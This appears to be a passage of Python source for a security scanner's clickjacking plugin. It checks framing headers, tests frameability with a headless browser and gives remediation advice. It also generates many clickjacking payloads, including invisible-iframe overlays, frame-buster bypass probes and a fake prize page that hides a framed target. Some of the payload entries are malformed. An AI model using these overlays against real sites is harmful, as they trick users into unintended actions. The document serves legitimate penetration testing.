"""
Advanced Clickjacking Exploit Plugin

This plugin provides production-quality clickjacking exploitation capabilities including:
- HTML proof-of-concept payload generation with interactive overlays
- Automated frameability detection using headless browser automation (Selenium/WebDriver)
- Evidence collection with annotated screenshots
- Comprehensive X-Frame-Options and CSP frame-ancestors header analysis
- Configuration for overlay appearance, test mode, browser type, and logging
- Detailed severity classification and actionable remediation advice
- Robust error handling and resource management

This plugin is designed for professional security teams, penetration testers, and 
automated scanning platforms.
"""

import sys
import os
import time
import logging
import json
import hashlib
import tempfile
import shutil
from typing import Dict, List, Any, Optional, Tuple
from urllib.parse import urlparse
from datetime import datetime
from pathlib import Path

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin
from scanner.plugins.payload_generator import get_payload_generator
from scanner.plugins.payload_mutator import PayloadMutator

try:
    import requests
    from requests.adapters import HTTPAdapter
    from requests.packages.urllib3.util.retry import Retry
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False
    logging.warning("Requests library not available. HTTP features will be limited.")

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.chrome.options import Options as ChromeOptions
    from selenium.webdriver.firefox.options import Options as FirefoxOptions
    from selenium.webdriver.chrome.service import Service as ChromeService
    from selenium.webdriver.firefox.service import Service as FirefoxService
    from selenium.common.exceptions import TimeoutException, WebDriverException
    HAS_SELENIUM = True
except ImportError:
    HAS_SELENIUM = False
    logging.warning("Selenium not available. Frameability testing will be limited.")

try:
    from PIL import Image, ImageDraw, ImageFont
    HAS_PIL = True
except ImportError:
    HAS_PIL = False
    logging.warning("PIL/Pillow not available. Screenshot annotation will be limited.")

logger = logging.getLogger(__name__)


class ClickjackingPlugin(ExploitPlugin):
    """
    Advanced Clickjacking Exploit Plugin
    
    This plugin provides comprehensive clickjacking testing and exploitation capabilities
    with professional-grade features for security teams and automated scanning platforms.
    
    Key Features:
    - HTML PoC generation with customizable overlays
    - Headless browser frameability detection
    - X-Frame-Options and CSP frame-ancestors analysis
    - Evidence collection with annotated screenshots
    - Configurable test parameters
    - Detailed reporting and remediation advice
    
    Configuration Options:
        overlay_style: Style of the overlay ('transparent', 'opaque', 'partial')
        overlay_text: Custom text to display on overlay
        overlay_opacity: Opacity level (0.0 to 1.0)
        test_mode: Enable test mode (generates PoC without browser test)
        browser_type: Browser to use ('chrome', 'firefox')
        headless: Run browser in headless mode (default: True)
        timeout: Browser operation timeout in seconds
        collect_evidence: Capture screenshots and evidence
        output_dir: Directory for saving evidence and reports
        verify_ssl: Verify SSL certificates (default: False)
        enable_annotations: Add annotations to screenshots
    """
    
    # Default configuration
    DEFAULT_CONFIG = {
        'overlay_style': 'transparent',
        'overlay_text': 'Click here to continue',
        'overlay_opacity': 0.3,
        'test_mode': False,
        'browser_type': 'chrome',
        'headless': True,
        'timeout': 30,
        'collect_evidence': True,
        'output_dir': './clickjacking_reports',
        'verify_ssl': False,
        'enable_annotations': True,
    }
    
    def __init__(self):
        """Initialize the clickjacking plugin."""
        super().__init__()
        self._temp_dirs: List[str] = []
        self._drivers: List[Any] = []
    
    @property
    def vulnerability_type(self) -> str:
        """Return the vulnerability type identifier."""
        return 'clickjacking'
    
    @property
    def name(self) -> str:
        """Return the plugin name."""
        return 'Advanced Clickjacking Exploit'
    
    @property
    def description(self) -> str:
        """Return the plugin description."""
        return ('Advanced clickjacking exploit plugin with HTML PoC generation, '
                'headless browser frameability detection, evidence collection, '
                'and comprehensive security header analysis.')
    
    @property
    def version(self) -> str:
        """Return the plugin version."""
        return '1.0.0'
    
    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """
        Generate clickjacking HTML proof-of-concept payloads.
        
        Args:
            context: Optional dictionary containing:
                - target_url: URL to frame (required)
                - overlay_style: Style of overlay ('transparent', 'opaque', 'partial')
                - overlay_text: Custom text for overlay
                - overlay_opacity: Opacity level (0.0-1.0)
                - action_description: Description of the action being hijacked
        
        Returns:
            List[str]: List of HTML payload strings
        """
        context = context or {}
        target_url = context.get('target_url', 'http://example.com')
        overlay_style = context.get('overlay_style', 'transparent')
        overlay_text = context.get('overlay_text', 'Click here to continue')
        overlay_opacity = context.get('overlay_opacity', 0.3)
        action_desc = context.get('action_description', 'perform an action')
        
        generator = get_payload_generator()
        base_payloads = generator.get_payloads('clickjacking', context)
        
        # Generate custom HTML payloads based on context
        payloads = []
        
        # Basic transparent overlay payload
        basic_payload = self._generate_html_poc(
            target_url=target_url,
            overlay_text=overlay_text,
            overlay_style='transparent',
            opacity=overlay_opacity,
            action_description=action_desc
        )
        payloads.append(basic_payload)
        
        # Opaque overlay payload (decoy page)
        opaque_payload = self._generate_html_poc(
            target_url=target_url,
            overlay_text='Win a Free Prize!',
            overlay_style='opaque',
            opacity=1.0,
            action_description=action_desc
        )
        payloads.append(opaque_payload)
        
        # Partial overlay payload (button hijacking)
        partial_payload = self._generate_html_poc(
            target_url=target_url,
            overlay_text='Continue',
            overlay_style='partial',
            opacity=0.5,
            action_description=action_desc
        )
        payloads.append(partial_payload)
        
        # Add any additional base payloads from generator
        payloads.extend(base_payloads)

        # Extra clickjacking test payloads (frame-buster bypass probes)
        extra_cj = [
            f'<iframe src="{target_url}" style="opacity:0;position:absolute;top:0;left:0;width:100%;height:100%;z-index:9999;"></iframe>',
            f'<iframe src="{target_url}" sandbox="allow-forms allow-scripts allow-same-origin"></iframe>',
            f'<iframe src="{target_url}" sandbox="allow-forms"></iframe>',
            f'<iframe src="{target_url}" allow="fullscreen"></iframe>',
            f'<iframe src="{target_url}" scrolling="no" frameborder="0"></iframe>',
            f'<object data="{target_url}"></object>',
            f'<embed src="{target_url}">',
            f'X-Frame-Options: ALLOW-FROM {target_url}',
            'X-Frame-Options: ALLOWALL',
            'X-Frame-Options: allow',
            'Content-Security-Policy: frame-ancestors *',
            'Content-Security-Policy: frame-ancestors none',
            f'<meta http-equiv="X-Frame-Options" content="ALLOWALL">',
            f'<frame src="{target_url}">',
            f'<frameset><frame src="{target_url}"></frameset>',
            f'<iframe src="{target_url}" id="target-frame" name="target-frame"></iframe>',
            f'<div style="width:100px;height:100px;overflow:hidden;position:relative"><iframe src="{target_url}" style="position:absolute;top:-100px;left:-100px;width:500px;height:500px;"></iframe></div>',
            f'<iframe src="{target_url}?#" style="opacity:0;pointer-events:all;"></iframe>',
            f'<body onload="window.frames[0].document.body.click()"><iframe src="{target_url}"></iframe>',
            f'<iframe src="{target_url}" onload="this.style.opacity=0"></iframe>',
            f'<details open><summary>Click</summary><iframe src="{target_url}"></iframe></details>',
            f'<iframe src="{target_url}" loading="eager"></iframe>',
            f'<iframe src="{target_url}" referrerpolicy="no-referrer"></iframe>',
            f'<img src="{target_url}" onerror="document.write(\'&lt;iframe src=&quot;{target_url}&quot;&gt;&lt;/iframe&gt;\')">',
            'javascript:document.write(\'<iframe src="TARGET_URL"></iframe>\')',
            'X-Frame-Options: SAMEORIGIN',
            'X-Frame-Options: DENY',
            'Content-Security-Policy: frame-ancestors self',
            f'<iframe src="{target_url}" csp="frame-ancestors *"></iframe>',
            f'<window.frames.location.href = "{target_url}">',
        ]
        payloads.extend(extra_cj)

        # Add more clickjacking probe payloads
        _EXTRA_CJ = [
            # Simple iframe embed tests
            f'<iframe src="{target_url}" width="800" height="600"></iframe>',
            f'<iframe src="{target_url}" style="border:none;width:100%;height:100%"></iframe>',
            # Invisible iframe test
            f'<iframe src="{target_url}" style="position:absolute;top:-9999px;left:-9999px;width:1px;height:1px;"></iframe>',
            # Double iframe test
            f'<iframe src="javascript:\'<iframe src=\\"{target_url}\\">\'" width="800" height="600"></iframe>',
            # Sandbox attribute tests
            f'<iframe src="{target_url}" sandbox="allow-forms allow-scripts" width="800" height="600"></iframe>',
            f'<iframe src="{target_url}" sandbox="" width="800" height="600"></iframe>',
            # UI redress via CSS
            f'<div style="position:relative"><iframe src="{target_url}" style="opacity:0.01;position:absolute;top:0;left:0;width:100%;height:100%;z-index:99999;"></iframe><div style="z-index:1">Visible Content</div></div>',
            # Scroll-based clickjacking
            f'<html><body style="height:10000px"><iframe src="{target_url}" style="position:fixed;top:0;left:0;width:100%;height:100%;opacity:0.01;z-index:99999;"></iframe><div style="position:fixed;top:50%;left:50%;">Click Here!</div></body></html>',
            # Drag-and-drop clickjacking
            f'<html><body><iframe src="{target_url}" id="target" style="position:absolute;opacity:0.0001;z-index:9999;"></iframe><div draggable="true">Drag me!</div></body></html>',
            # Form hijacking via iframe
            f'<html><body><iframe src="{target_url}" style="position:absolute;top:0;left:0;width:100%;height:100%;opacity:0;z-index:9999;"></iframe><input type="submit" value="Subscribe" style="position:absolute;top:100px;left:100px;z-index:1;"></body></html>',
            # Tab ordering attack
            f'<iframe src="{target_url}" tabindex="1"></iframe>',
            # Autofocus attack
            f'<iframe src="{target_url}"><input autofocus></iframe>',
            # Meta refresh clickjacking
            f'<html><head><meta http-equiv="refresh" content="0;url={target_url}"></head></html>',
            # Frameset attack
            f'<html><frameset><frame src="{target_url}"></frameset></html>',
            # Object tag embed
            f'<object data="{target_url}" type="text/html" width="800" height="600"></object>',
            # Embed tag test
            f'<embed src="{target_url}" type="text/html" width="800" height="600" />',
        ]
        for p in _EXTRA_CJ:
            if p not in payloads:
                payloads.append(p)

        # Generate dynamic clickjacking payloads
        dynamic_cj = []
        for opacity in ['0', '0.01', '0.05', '0.1', '0.2', '0.3', '0.5', '0.7', '0.9', '1.0']:
            dynamic_cj.append(f'<iframe src="{target_url}" style="opacity:{opacity};position:absolute;top:0;left:0;width:100%;height:100%;z-index:9999;"></iframe>')
        for w, h in [('100%', '100%'), ('800px', '600px'), ('1024px', '768px'),
                     ('1280px', '720px'), ('500px', '400px'), ('320px', '568px')]:
            dynamic_cj.append(f'<iframe src="{target_url}" width="{w}" height="{h}" frameborder="0"></iframe>')
        for sandbox in ['allow-forms', 'allow-scripts', 'allow-same-origin',
                        'allow-forms allow-scripts', 'allow-forms allow-same-origin',
                        'allow-scripts allow-same-origin', 'allow-forms allow-scripts allow-same-origin',
                        '']:
            dynamic_cj.append(f'<iframe src="{target_url}" sandbox="{sandbox}"></iframe>')
        for pos in ['0,0', '0,100', '100,0', '100,100', '200,200', '50,50']:
            t, l = pos.split(',')
            dynamic_cj.append(f'<div style="position:relative;overflow:hidden;width:300px;height:200px;"><iframe src="{target_url}" style="position:absolute;top:-{t}px;left:-{l}px;"></iframe></div>')
        payloads.extend(dynamic_cj)
        # Additional clickjacking bypass attempts
        more_cj = []
        for proto in ['http', 'https']:
            for port in [80, 443, 8080, 8443, 3000, 4000, 5000]:
                more_cj.append(f'<iframe src="{proto}://target.example.com:{port}" style="opacity:0;width:100%;height:100%;position:absolute;top:0;left:0;z-index:9999;"></iframe>')
        for x_offset in range(-200, 201, 50):
            more_cj.append(f'<div style="overflow:hidden;width:300px;height:200px"><iframe src="{target_url}" style="position:absolute;left:{x_offset}px;top:0;width:1000px;height:600px;border:0;"></iframe></div>')
        for allow in ['', 'fullscreen', 'autoplay', 'camera', 'microphone', 'geolocation',
                      'payment', 'usb', 'clipboard-write', 'display-capture']:
            more_cj.append(f'<iframe src="{target_url}" allow="{allow}"></iframe>')
        payloads.extend(more_cj)
        return PayloadMutator.scale_payloads_to_minimum(payloads)
    
    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                      config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """
        Execute clickjacking attack against a target.
        
        This method:
        1. Analyzes security headers (X-Frame-Options, CSP frame-ancestors)
        2. Tests frameability using headless browser
        3. Generates HTML proof-of-concept if vulnerable
        4. Collects evidence with screenshots
        5. Provides detailed remediation advice
        
        Args:
            target_url: The target URL to test
            vulnerability_data: Dictionary containing:
                - action_url: Specific action URL to test (optional)
                - action_description: Description of action (optional)
            config: Optional configuration dictionary
        
        Returns:
            Dict[str, Any]: Attack results containing:
                - success: bool indicating if vulnerability found
                - vulnerable: bool indicating if target is frameable
                - findings: List of finding dictionaries
                - data: Additional data (headers, PoC path, etc.)
                - evidence: Evidence description
                - error: Error message if attack failed
                - severity: Severity level
                - remediation: Remediation advice
        """
        result = {
            'success': False,
            'vulnerable': False,
            'findings': [],
            'data': {},
            'evidence': '',
            'error': None,
            'severity': 'medium',
            'remediation': '',
        }
        
        # Merge default config with provided config
        config = {**self.DEFAULT_CONFIG, **(config or {})}
        
        try:
            logger.info(f"Starting clickjacking test for {target_url}")
            
            # Step 1: Analyze security headers
            header_analysis = self._analyze_security_headers(target_url, config)
            result['data']['headers'] = header_analysis
            
            # Step 2: Determine if headers allow framing
            headers_allow_framing = header_analysis.get('allows_framing', False)
            result['data']['headers_allow_framing'] = headers_allow_framing
            
            # Step 3: Test frameability with browser (if not in test mode)
            if not config.get('test_mode', False) and HAS_SELENIUM:
                frameability_result = self._test_frameability(target_url, config)
                result['data']['frameability'] = frameability_result
                is_frameable = frameability_result.get('frameable', False)
            else:
                # In test mode or no Selenium, use header analysis only
                is_frameable = headers_allow_framing
                frameability_result = {
                    'frameable': is_frameable,
                    'method': 'header_analysis_only',
                }
                result['data']['frameability'] = frameability_result
            
            # Step 4: Determine vulnerability
            if is_frameable:
                result['vulnerable'] = True
                result['success'] = True
                
                # Generate HTML PoC
                action_desc = vulnerability_data.get('action_description', 'perform an action')
                poc_html = self._generate_html_poc(
                    target_url=target_url,
                    overlay_text=config.get('overlay_text', 'Click here'),
                    overlay_style=config.get('overlay_style', 'transparent'),
                    opacity=config.get('overlay_opacity', 0.3),
                    action_description=action_desc
                )
                
                # Save PoC to file
                if config.get('collect_evidence', True):
                    poc_path = self._save_poc(poc_html, target_url, config)
                    result['data']['poc_path'] = poc_path
                    result['data']['poc_html'] = poc_html
                
                # Determine severity based on context
                severity = self._determine_severity(header_analysis, vulnerability_data)
                result['severity'] = severity
                
                # Build finding
                finding = {
                    'type': 'clickjacking',
                    'target': target_url,
                    'severity': severity,
                    'description': 'Target is vulnerable to clickjacking attacks',
                    'evidence': self._build_evidence_description(header_analysis, frameability_result),
                    'poc_available': True,
                }
                result['findings'].append(finding)
                result['evidence'] = finding['evidence']
                
                logger.info(f"Clickjacking vulnerability found: {target_url}")
            else:
                result['success'] = True  # Successful scan, but no vulnerability
                result['vulnerable'] = False
                result['evidence'] = 'Target has adequate clickjacking protections'
                logger.info(f"No clickjacking vulnerability: {target_url}")
            
            # Add remediation advice
            result['remediation'] = self.get_remediation_advice()
            
        except Exception as e:
            logger.error(f"Error during clickjacking test: {e}", exc_info=True)
            result['error'] = str(e)
            result['success'] = False
        finally:
            # Clean up resources
            self._cleanup()
        
        return result
    
    def get_remediation_advice(self) -> str:
        """
        Return detailed remediation advice for clickjacking vulnerabilities.
        
        Returns:
            str: Comprehensive remediation guidance
        """
        return """
CLICKJACKING REMEDIATION ADVICE:

1. X-Frame-Options Header (Legacy but widely supported):
   - Set to 'DENY' to prevent all framing
   - Set to 'SAMEORIGIN' to allow only same-origin framing
   - Example: X-Frame-Options: DENY

2. Content-Security-Policy (Modern approach):
   - Use 'frame-ancestors' directive
   - Set to 'none' to prevent all framing
   - Set to 'self' to allow only same-origin framing
   - Example: Content-Security-Policy: frame-ancestors 'none'
   - Example: Content-Security-Policy: frame-ancestors 'self'

3. Implementation Recommendations:
   - Use both X-Frame-Options AND CSP frame-ancestors for defense in depth
   - Apply headers to ALL pages, not just sensitive ones
   - Test thoroughly after implementation
   - Consider implementing frame-busting JavaScript as additional layer (not primary defense)

4. Priority Actions:
   - Configure web server or application framework to send headers
   - For Apache: Header always set X-Frame-Options "DENY"
   - For Nginx: add_header X-Frame-Options "DENY" always;
   - For IIS: Add custom HTTP response header
   - For application frameworks, use security middleware

5. Additional Considerations:
   - Review all forms and actions that could be exploited
   - Implement CSRF tokens for state-changing operations
   - Use user interaction confirmations for sensitive actions
   - Educate users about the risks of embedded content
"""
    
    def verify(self, result: Dict[str, Any], 
               target_url: str,
               vulnerability_data: Dict[str, Any]) -> tuple:
        """Verify clickjacking with proof of missing frame protection."""
        if not result.get('success'):
            return False, None
        
        evidence = result.get('evidence', '')
        
        # Verified if we confirmed missing X-Frame-Options or CSP frame-ancestors
        if 'x-frame-options' in evidence.lower() or 'frame-ancestors' in evidence.lower():
            proof = f"‚úì VERIFIED - Clickjacking Vulnerability\n\nEvidence: {evidence[:300]}\n\nImpact: Page can be embedded in iframe for clickjacking attacks"
            return True, proof
        
        return False, None
    
    def get_severity_level(self) -> str:
        """
        Return the typical severity level for clickjacking.
        
        Returns:
            str: Severity level ('low', 'medium', 'high', 'critical')
        """
        return 'medium'
    
    def validate_config(self, config: Dict[str, Any]) -> bool:
        """
        Validate the configuration for this plugin.
        
        Args:
            config: Configuration dictionary to validate
        
        Returns:
            bool: True if configuration is valid, False otherwise
        """
        if not config:
            return True
        
        # Validate overlay_opacity
        if 'overlay_opacity' in config:
            opacity = config['overlay_opacity']
            if not isinstance(opacity, (int, float)) or not (0.0 <= opacity <= 1.0):
                logger.error("overlay_opacity must be a number between 0.0 and 1.0")
                return False
        
        # Validate browser_type
        if 'browser_type' in config:
            if config['browser_type'] not in ['chrome', 'firefox']:
                logger.error("browser_type must be 'chrome' or 'firefox'")
                return False
        
        # Validate timeout
        if 'timeout' in config:
            if not isinstance(config['timeout'], (int, float)) or config['timeout'] <= 0:
                logger.error("timeout must be a positive number")
                return False
        
        return True
    
    def get_required_config_keys(self) -> List[str]:
        """
        Return list of required configuration keys.
        
        Returns:
            List[str]: Empty list (no required keys, all have defaults)
        """
        return []
    
    # Private helper methods
    
    def _analyze_security_headers(self, url: str, config: Dict[str, Any]) -> Dict[str, Any]:
        """
        Analyze security headers related to framing protection.
        
        Args:
            url: Target URL to analyze
            config: Configuration dictionary
        
        Returns:
            Dict containing header analysis results
        """
        analysis = {
            'x_frame_options': None,
            'csp_frame_ancestors': None,
            'allows_framing': True,
            'protection_level': 'none',
            'headers': {},
        }
        
        if not HAS_REQUESTS:
            logger.warning("Requests library not available, skipping header analysis")
            return analysis
        
        try:
            # Make request with timeout
            timeout = config.get('timeout', 30)
            verify_ssl = config.get('verify_ssl', False)
            
            response = requests.get(
                url,
                timeout=timeout,
                verify=verify_ssl,
                allow_redirects=True,
                headers={'User-Agent': 'Mozilla/5.0 (Security Scanner)'}
            )
            
            # Store relevant headers
            headers = response.headers
            analysis['headers'] = dict(headers)
            
            # Check X-Frame-Options
            xfo = headers.get('X-Frame-Options', '').upper()
            if xfo:
                analysis['x_frame_options'] = xfo
                if xfo in ('DENY', 'SAMEORIGIN'):
                    analysis['allows_framing'] = False
                    analysis['protection_level'] = 'good'
            
            # Check Content-Security-Policy frame-ancestors
            csp = headers.get('Content-Security-Policy', '')
            if csp:
                # Parse frame-ancestors directive
                for directive in csp.split(';'):
                    directive = directive.strip()
                    if directive.startswith('frame-ancestors'):
                        frame_ancestors = directive.replace('frame-ancestors', '').strip()
                        analysis['csp_frame_ancestors'] = frame_ancestors
                        
                        # Check if it blocks framing
                        if "'none'" in frame_ancestors.lower() or frame_ancestors.lower() == 'none':
                            analysis['allows_framing'] = False
                            analysis['protection_level'] = 'excellent'
                        elif "'self'" in frame_ancestors.lower():
                            # Only same-origin framing allowed
                            analysis['allows_framing'] = False
                            analysis['protection_level'] = 'good'
            
            logger.info(f"Header analysis complete: {analysis['protection_level']} protection")
            
        except Exception as e:
            logger.error(f"Error analyzing headers: {e}")
            analysis['error'] = str(e)
        
        return analysis
    
    def _test_frameability(self, url: str, config: Dict[str, Any]) -> Dict[str, Any]:
        """
        Test if a URL can be framed using a headless browser.
        
        Args:
            url: Target URL to test
            config: Configuration dictionary
        
        Returns:
            Dict containing frameability test results
        """
        result = {
            'frameable': False,
            'method': 'browser_test',
            'error': None,
            'screenshot_path': None,
        }
        
        if not HAS_SELENIUM:
            logger.warning("Selenium not available, cannot perform browser test")
            result['error'] = 'Selenium not available'
            return result
        
        driver = None
        temp_html = None
        
        try:
            # Create a temporary HTML file with iframe
            temp_dir = tempfile.mkdtemp(prefix='clickjacking_')
            self._temp_dirs.append(temp_dir)
            
            temp_html = os.path.join(temp_dir, 'test_frame.html')
            test_html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Frameability Test</title>
    <style>
        body {{ margin: 0; padding: 0; }}
        #test-frame {{ width: 100%; height: 600px; border: 2px solid red; }}
    </style>
</head>
<body>
    <h1>Frameability Test</h1>
    <iframe id="test-frame" src="{url}"></iframe>
    <script>
        // Check if iframe loaded successfully
        window.frameLoaded = false;
        document.getElementById('test-frame').onload = function() {{
            window.frameLoaded = true;
        }};
    </script>
</body>
</html>
"""
            with open(temp_html, 'w') as f:
                f.write(test_html)
            
            # Set up browser
            driver = self._create_driver(config)
            self._drivers.append(driver)
            
            # Load the test page
            driver.get(f'file://{temp_html}')
            time.sleep(2)  # Wait for page to load
            
            # Check if iframe loaded
            try:
                frame_loaded = driver.execute_script("return window.frameLoaded;")
                if frame_loaded:
                    result['frameable'] = True
                    logger.info(f"URL is frameable: {url}")
                else:
                    result['frameable'] = False
                    logger.info(f"URL is not frameable (frame blocked): {url}")
            except Exception as e:
                logger.warning(f"Could not determine frame status: {e}")
                result['frameable'] = False
            
            # Capture screenshot if evidence collection enabled
            if config.get('collect_evidence', True):
                screenshot_path = self._capture_screenshot(driver, url, config, temp_dir)
                result['screenshot_path'] = screenshot_path
            
        except Exception as e:
            logger.error(f"Error testing frameability: {e}", exc_info=True)
            result['error'] = str(e)
            result['frameable'] = False
        
        return result
    
    def _create_driver(self, config: Dict[str, Any]) -> Any:
        """
        Create a Selenium WebDriver instance.
        
        Args:
            config: Configuration dictionary
        
        Returns:
            WebDriver instance
        """
        browser_type = config.get('browser_type', 'chrome')
        headless = config.get('headless', True)
        
        if browser_type == 'chrome':
            options = ChromeOptions()
            if headless:
                options.add_argument('--headless')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-gpu')
            options.add_argument('--window-size=1920,1080')
            
            driver = webdriver.Chrome(options=options)
        elif browser_type == 'firefox':
            options = FirefoxOptions()
            if headless:
                options.add_argument('--headless')
            options.add_argument('--width=1920')
            options.add_argument('--height=1080')
            
            driver = webdriver.Firefox(options=options)
        else:
            raise ValueError(f"Unsupported browser type: {browser_type}")
        
        # Set timeout
        driver.set_page_load_timeout(config.get('timeout', 30))
        
        return driver
    
    def _capture_screenshot(self, driver: Any, url: str, config: Dict[str, Any], 
                          output_dir: str) -> Optional[str]:
        """
        Capture and annotate a screenshot.
        
        Args:
            driver: WebDriver instance
            url: Target URL
            config: Configuration dictionary
            output_dir: Output directory for screenshot
        
        Returns:
            Path to saved screenshot or None
        """
        try:
            # Generate filename
            url_hash = hashlib.md5(url.encode()).hexdigest()[:8]
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f'clickjacking_{url_hash}_{timestamp}.png'
            screenshot_path = os.path.join(output_dir, filename)
            
            # Capture screenshot
            driver.save_screenshot(screenshot_path)
            
            # Annotate screenshot if enabled and PIL available
            if config.get('enable_annotations', True) and HAS_PIL:
                self._annotate_screenshot(screenshot_path, url, config)
            
            logger.info(f"Screenshot saved: {screenshot_path}")
            return screenshot_path
            
        except Exception as e:
            logger.error(f"Error capturing screenshot: {e}")
            return None
    
    def _annotate_screenshot(self, screenshot_path: str, url: str, 
                            config: Dict[str, Any]) -> None:
        """
        Add annotations to a screenshot.
        
        Args:
            screenshot_path: Path to screenshot file
            url: Target URL
            config: Configuration dictionary
        """
        try:
            # Open image
            img = Image.open(screenshot_path)
            draw = ImageDraw.Draw(img)
            
            # Add text annotation
            text = f"Clickjacking Test: {url}"
            
            # Try to use a decent font, fall back to default
            # Check multiple common font locations for cross-platform compatibility
            font = None
            font_paths = [
                # Linux paths
                "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf",
                "/usr/share/fonts/truetype/liberation/LiberationSans-Bold.ttf",
                # macOS paths
                "/System/Library/Fonts/Helvetica.ttc",
                "/Library/Fonts/Arial Bold.ttf",
                # Windows paths
                "C:\\Windows\\Fonts\\arialbd.ttf",
                "C:\\Windows\\Fonts\\Arial.ttf",
            ]
            
            for font_path in font_paths:
                try:
                    font = ImageFont.truetype(font_path, 20)
                    break
                except (OSError, IOError):
                    continue
            
            # Fall back to default if no font found
            if font is None:
                font = ImageFont.load_default()
            
            # Add background rectangle for text
            bbox = draw.textbbox((10, 10), text, font=font)
            draw.rectangle(bbox, fill='black')
            draw.text((10, 10), text, fill='red', font=font)
            
            # Save annotated image
            img.save(screenshot_path)
            logger.info(f"Screenshot annotated: {screenshot_path}")
            
        except Exception as e:
            logger.error(f"Error annotating screenshot: {e}")
    
    def _generate_html_poc(self, target_url: str, overlay_text: str, 
                          overlay_style: str, opacity: float,
                          action_description: str) -> str:
        """
        Generate HTML proof-of-concept for clickjacking.
        
        Args:
            target_url: URL to frame
            overlay_text: Text to display on overlay
            overlay_style: Style of overlay
            opacity: Opacity level
            action_description: Description of hijacked action
        
        Returns:
            HTML string
        """
        if overlay_style == 'transparent':
            return self._generate_transparent_overlay_poc(
                target_url, overlay_text, opacity, action_description
            )
        elif overlay_style == 'opaque':
            return self._generate_opaque_overlay_poc(
                target_url, overlay_text, action_description
            )
        elif overlay_style == 'partial':
            return self._generate_partial_overlay_poc(
                target_url, overlay_text, opacity, action_description
            )
        else:
            return self._generate_transparent_overlay_poc(
                target_url, overlay_text, opacity, action_description
            )
    
    def _generate_transparent_overlay_poc(self, target_url: str, overlay_text: str,
                                         opacity: float, action_description: str) -> str:
        """Generate transparent overlay PoC HTML."""
        return f"""<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC - Transparent Overlay</title>
    <style>
        body {{
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
        }}
        
        .warning {{
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            background-color: #ff0000;
            color: white;
            padding: 10px;
            text-align: center;
            z-index: 9999;
            font-weight: bold;
        }}
        
        .container {{
            position: relative;
            width: 100%;
            height: 100vh;
            margin-top: 40px;
        }}
        
        #target-frame {{
            position: absolute;
            width: 100%;
            height: 100%;
            border: none;
            opacity: {opacity};
            z-index: 1;
        }}
        
        .decoy-overlay {{
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 2;
            pointer-events: none;
        }}
        
        .decoy-button {{
            background-color: #4CAF50;
            border: none;
            color: white;
            padding: 20px 40px;
            text-align: center;
            font-size: 18px;
            cursor: pointer;
            border-radius: 5px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
            pointer-events: all;
        }}
        
        .decoy-button:hover {{
            background-color: #45a049;
        }}
    </style>
</head>
<body>
    <div class="warning">
        ‚ö†Ô∏è SECURITY RESEARCH - PROOF OF CONCEPT ‚ö†Ô∏è<br>
        This demonstrates a clickjacking vulnerability. The button below appears to {action_description},
        but actually interacts with the framed page below.
    </div>
    
    <div class="container">
        <iframe id="target-frame" src="{target_url}"></iframe>
        <div class="decoy-overlay">
            <button class="decoy-button">{overlay_text}</button>
        </div>
    </div>
    
    <script>
        // Log clicks for demonstration
        document.querySelector('.decoy-button').addEventListener('click', function(e) {{
            console.log('User clicked decoy button, but actually clicked iframe below');
        }});
    </script>
</body>
</html>"""
    
    def _generate_opaque_overlay_poc(self, target_url: str, overlay_text: str,
                                    action_description: str) -> str:
        """Generate opaque overlay (decoy page) PoC HTML."""
        return f"""<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC - Opaque Overlay</title>
    <style>
        body {{
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
        }}
        
        .warning {{
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            background-color: #ff0000;
            color: white;
            padding: 10px;
            text-align: center;
            z-index: 9999;
            font-weight: bold;
        }}
        
        .container {{
            position: relative;
            width: 100%;
            height: 100vh;
            margin-top: 40px;
        }}
        
        #target-frame {{
            position: absolute;
            width: 500px;
            height: 500px;
            top: 200px;
            left: 50%;
            transform: translateX(-50%);
            border: none;
            opacity: 0.01;
            z-index: 2;
        }}
        
        .decoy-page {{
            position: absolute;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 1;
        }}
        
        .prize-box {{
            background-color: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
            text-align: center;
        }}
        
        .prize-box h1 {{
            color: #667eea;
            margin-bottom: 20px;
        }}
        
        .prize-box p {{
            font-size: 18px;
            margin-bottom: 30px;
            color: #333;
        }}
        
        .claim-button {{
            background-color: #4CAF50;
            border: none;
            color: white;
            padding: 20px 50px;
            font-size: 20px;
            cursor: pointer;
            border-radius: 5px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.2);
        }}
        
        .claim-button:hover {{
            background-color: #45a049;
        }}
    </style>
</head>
<body>
    <div class="warning">
        ‚ö†Ô∏è SECURITY RESEARCH - PROOF OF CONCEPT ‚ö†Ô∏è<br>
        This is a decoy page. Clicking the button below actually interacts with a hidden framed page.
    </div>
    
    <div class="container">
        <div class="decoy-page">
            <div class="prize-box">
                <h1>üéâ Congratulations! üéâ</h1>
                <p>You've won a $1000 gift card!</p>
                <p>Click below to claim your prize</p>
                <button class="claim-button">{overlay_text}</button>
            </div>
        </div>
        <iframe id="target-frame" src="{target_url}"></iframe>
    </div>
    
    <script>
        // Position the iframe over the button precisely
        // In a real attack, this would be carefully aligned
        console.log('Hidden iframe positioned over decoy button');
    </script>
</body>
</html>"""
    
    def _generate_partial_overlay_poc(self, target_url: str, overlay_text: str,
